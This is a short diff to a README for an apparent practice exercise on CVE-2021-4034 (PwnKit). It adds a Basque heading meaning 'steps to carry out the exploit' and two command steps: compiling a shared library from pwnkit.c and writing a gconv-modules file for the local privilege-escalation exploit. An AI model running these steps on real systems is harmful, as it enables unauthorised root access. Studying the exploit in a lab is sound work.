@@ -1,5 +1,7 @@
 # DEV_Practica_CVE_2021_4034
 
+Exploita egiteko pausoak
+
 1. gcc -Wall -shared -fPIC -o pwnkit.so pwnkit.c
 
 2. echo "module UTF-8// TRUKITO// pwnkit 1" > gconv-modules
